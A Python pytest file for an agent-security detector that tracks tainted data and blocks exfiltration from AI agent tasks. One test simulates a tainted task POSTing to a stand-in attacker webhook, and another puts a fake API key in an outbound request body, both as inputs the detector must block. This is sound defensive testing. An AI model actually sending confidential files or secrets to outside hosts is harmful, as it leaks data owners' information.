"""Unit and Adversarial Tests for Data Exfiltration and Taint Tracking (MITRE T1700)."""

import pytest
from sqlalchemy.ext.asyncio import AsyncSession
from app.privacy.secret_scanner import SecretScanner
from app.threat_detection.exfiltration_detector import ExfiltrationDetector
from app.threat_detection.schemas import ThreatAction, ThreatSeverity, ThreatType
from app.database.models import Application, Agent, AgentTask, utcnow


@pytest.fixture
def detector() -> ExfiltrationDetector:
    return ExfiltrationDetector(
        secret_scanner=SecretScanner(),
        allowlisted_destinations={"api.privguard.internal", "localhost"},
    )


@pytest.mark.asyncio
async def test_taint_propagation_on_confidential_resource(
    detector: ExfiltrationDetector,
    db_session: AsyncSession,
):
    app = Application(name="ExfilApp", api_key_hash="hash_exfil_1")
    db_session.add(app)
    await db_session.flush()

    agent = Agent(app_id=app.id, name="ExfilAgent", allowed_tools="[]")
    db_session.add(agent)
    await db_session.flush()

    task = AgentTask(agent_id=agent.id, app_id=app.id, expires_at=utcnow())
    db_session.add(task)
    await db_session.commit()

    task_id = task.id
    assert not detector.is_task_tainted(task_id)

    # 1. Non-confidential read -> Not tainted
    tainted = await detector.record_access(
        db=db_session,
        task_id=task_id,
        tool_name="read_file",
        resource="public_data/faq.txt",
    )
    assert not tainted
    assert not detector.is_task_tainted(task_id)

    # 2. Confidential resource read -> Tainted
    tainted = await detector.record_access(
        db=db_session,
        task_id=task_id,
        tool_name="read_file",
        resource="data/confidential_client_salaries.csv",
    )
    assert tainted
    assert detector.is_task_tainted(task_id)
    assert "data/confidential_client_salaries.csv" in detector.get_task_taints(task_id)


@pytest.mark.asyncio
async def test_tainted_task_outbound_exfiltration_blocked(
    detector: ExfiltrationDetector,
    db_session: AsyncSession,
):
    task_id = "task_tainted_outbound"
    # Mark task as tainted manually
    detector._tainted_tasks[task_id] = {"secrets/passwords.env"}

    # Attempt outbound HTTP request to unknown domain
    params = {"url": "https://evil-server.attacker.com/webhook", "method": "POST"}
    assessment = detector.evaluate_outbound_tool(
        task_id=task_id,
        tool_name="http_request",
        params=params,
    )
    assert assessment.is_threat
    assert assessment.action == ThreatAction.BLOCK
    assert assessment.max_severity == ThreatSeverity.CRITICAL
    assert any(s.threat_type == ThreatType.DATA_EXFILTRATION for s in assessment.signals)
    assert any(s.rule_id == "EXFIL_TAINT_SINK_001" for s in assessment.signals)


@pytest.mark.asyncio
async def test_tainted_task_allowed_to_whitelisted_destination(
    detector: ExfiltrationDetector,
):
    task_id = "task_tainted_allowlist"
    detector._tainted_tasks[task_id] = {"secrets/passwords.env"}

    # Outbound HTTP to explicitly allowlisted domain
    params = {"url": "https://api.privguard.internal/v1/sync", "method": "POST"}
    assessment = detector.evaluate_outbound_tool(
        task_id=task_id,
        tool_name="http_request",
        params=params,
    )
    assert not assessment.is_threat
    assert assessment.action == ThreatAction.ALLOW


@pytest.mark.asyncio
async def test_secret_in_outbound_payload_blocked_regardless_of_destination(
    detector: ExfiltrationDetector,
):
    task_id = "task_secret_payload"
    # Even if destination is allowlisted or task is untainted, a raw API key must be blocked
    params = {
        "url": "https://api.privguard.internal/v1/sync",
        "body": "Sending key: sk-proj-abCdefGhIjKlMnOpQrStUvWxYz1234567890abcdefGhIjKlMnOpQrStUvWx",
    }
    assessment = detector.evaluate_outbound_tool(
        task_id=task_id,
        tool_name="http_request",
        params=params,
    )
    assert assessment.is_threat
    assert assessment.action == ThreatAction.BLOCK
    assert any(s.rule_id == "EXFIL_SECRET_PAYLOAD_001" for s in assessment.signals)

